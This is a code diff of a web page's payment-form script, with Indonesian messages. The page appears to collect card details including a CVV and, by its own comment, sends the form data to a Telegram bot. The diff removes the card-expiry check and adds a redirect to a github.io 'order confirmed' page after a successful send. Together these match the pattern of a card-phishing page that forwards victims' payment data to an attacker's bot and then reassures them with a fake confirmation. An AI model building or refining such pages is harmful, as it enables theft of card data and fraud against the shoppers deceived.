@@ -191,13 +191,12 @@ span.price {
     // Check if any required field is empty
     const requiredFields = document.querySelectorAll('input[required]');
     let isValid = true;
-    let missingFields = [];
 
     // Check for empty required fields
     requiredFields.forEach(function(input) {
       if (!input.value.trim()) {
         isValid = false;
-        missingFields.push(input.name || input.id);
+        alert(`${input.name || input.id} is required.`);
       }
     });
 
@@ -226,8 +225,6 @@ span.price {
       alert("Invalid CVV.");
     }
 
-    // Removed expiration validation, so we no longer check card expiration
-
     if (!isValid) return;
 
     // If form is valid, collect form data and send to Telegram bot
@@ -254,6 +251,8 @@ span.price {
     .then(data => {
       if (data.ok) {
         alert('Formulir berhasil dikirim ke Telegram!');
+        // Redirect to the specified link
+        window.location.href = 'https://wahyu163.github.io/order-confirmed-page/'; // Replace with your desired URL
       } else {
         console.error('Telegram API Error:', data);
         alert('Terjadi kesalahan, coba lagi.');
@@ -270,6 +269,6 @@ span.price {
     const re = /^[a-zA-Z0-9._-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,6}$/;
     return re.test(String(email).toLowerCase());
   }
-</script>
+      </script>
 </body>
 </html>
